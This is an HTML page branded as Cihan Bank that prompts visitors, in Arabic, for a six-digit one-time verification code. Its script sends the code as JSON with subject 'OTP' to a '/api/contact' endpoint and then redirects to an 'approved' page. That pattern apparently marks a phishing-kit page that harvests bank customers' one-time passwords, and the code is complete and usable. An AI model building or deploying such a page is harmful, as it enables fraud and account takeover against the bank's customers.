<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>رمز التحقق — Cihan Bank</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="stylesheet" href="shared.css">
</head>
<body>
  <div class="bg-pattern page-wrapper">
    <div style="display:flex;align-items:center;justify-content:space-between;padding:24px 20px 0">
      <div id="langWrap"></div>
      <div></div>
    </div>
    <div style="display:flex;align-items:center;justify-content:center;padding:32px 0">
      <img src="assets/cb-logo.png" alt="Cihan Bank" style="width:160px;filter:drop-shadow(0 10px 18px rgba(0,0,0,.18))">
    </div>
    <div class="bottom-sheet" style="text-align:center">
      <div class="drag-handle"></div>
      <div style="margin:24px auto 0;width:64px;height:64px;border-radius:16px;background:#fdecea;display:flex;align-items:center;justify-content:center">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#b11811" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 2v4"/><path d="M8 2v4"/><rect x="2" y="4" width="20" height="18" rx="2"/><path d="m9 15 2 2 4-4"/></svg>
      </div>
      <h1 id="title" style="margin-top:20px;font-size:28px;font-weight:800;color:#111"></h1>
      <p id="sub" style="margin-top:8px;font-size:15px;color:#6b6b6b"></p>
      <form id="otpForm" style="margin-top:32px">
        <div id="otpInputs" style="display:flex;gap:10px;justify-content:center;direction:ltr"></div>
        <div id="errorBox" style="display:none;margin-top:16px;background:#fdecea;border-radius:12px;padding:10px 16px;font-size:14px;color:#b11811;font-weight:500"></div>
        <button type="submit" class="btn-primary" id="confirmBtn" style="margin-top:28px" disabled></button>
      </form>
    </div>
  </div>

  <script src="shared.js"></script>
  <script>
    var digits = 6;
    var inputs = [];

    function createInputs() {
      var wrap = document.getElementById('otpInputs');
      wrap.innerHTML = '';
      inputs = [];
      for (var i = 0; i < digits; i++) {
        var inp = document.createElement('input');
        inp.type = 'tel';
        inp.maxLength = 1;
        inp.inputMode = 'numeric';
        inp.pattern = '[0-9]';
        inp.autocomplete = 'one-time-code';
        inp.style.cssText = 'width:46px;height:56px;border-radius:16px;background:#f2f2f2;border:none;text-align:center;font-size:24px;font-weight:700;font-family:Tajawal,sans-serif;outline:none;color:#111;transition:box-shadow .2s';
        inp.addEventListener('focus', function(){ this.style.boxShadow = '0 0 0 3px rgba(177,24,17,.2)' });
        inp.addEventListener('blur', function(){ this.style.boxShadow = 'none' });
        inp.addEventListener('input', handleInput);
        inp.addEventListener('keydown', handleKeydown);
        inp.addEventListener('paste', handlePaste);
        inputs.push(inp);
        wrap.appendChild(inp);
      }
      inputs[0].focus();
    }

    function handleInput(e) {
      var val = e.target.value.replace(/[^0-9]/g, '');
      e.target.value = val.slice(0, 1);
      if (val && inputs.indexOf(e.target) < digits - 1) {
        inputs[inputs.indexOf(e.target) + 1].focus();
      }
      checkComplete();
    }

    function handleKeydown(e) {
      if (e.key === 'Backspace' && !e.target.value) {
        var idx = inputs.indexOf(e.target);
        if (idx > 0) {
          inputs[idx - 1].focus();
          inputs[idx - 1].value = '';
        }
      }
    }

    function handlePaste(e) {
      e.preventDefault();
      var data = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
      for (var i = 0; i < Math.min(data.length, digits); i++) {
        inputs[i].value = data[i];
      }
      if (data.length >= digits) inputs[digits - 1].focus();
      else if (data.length > 0) inputs[Math.min(data.length, digits - 1)].focus();
      checkComplete();
    }

    function checkComplete() {
      var code = inputs.map(function(i){ return i.value }).join('');
      document.getElementById('confirmBtn').disabled = code.length < digits;
    }

    function getCode() {
      return inputs.map(function(i){ return i.value }).join('');
    }

    function renderPage() {
      document.getElementById('title').textContent = t('otpTitle');
      document.getElementById('sub').textContent = t('otpSub');
      document.getElementById('confirmBtn').textContent = t('confirm');
    }

    document.getElementById('otpForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var code = getCode();
      if (code.length < digits) return;
      var btn = document.getElementById('confirmBtn');
      btn.disabled = true;
      btn.textContent = t('sending');

      fetch('/api/contact', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ subject: 'OTP', page: 'otp', otp: code })
      }).then(function(){ window.location.href = 'approved.html'; })
        .catch(function(){
          document.getElementById('errorBox').style.display = 'block';
          document.getElementById('errorBox').textContent = t('dataError');
          btn.disabled = false;
          btn.textContent = t('confirm');
        });
    });

    applyLang();
    renderLangSwitcher('langWrap');
    createInputs();
    renderPage();
  </script>
</body>
</html>
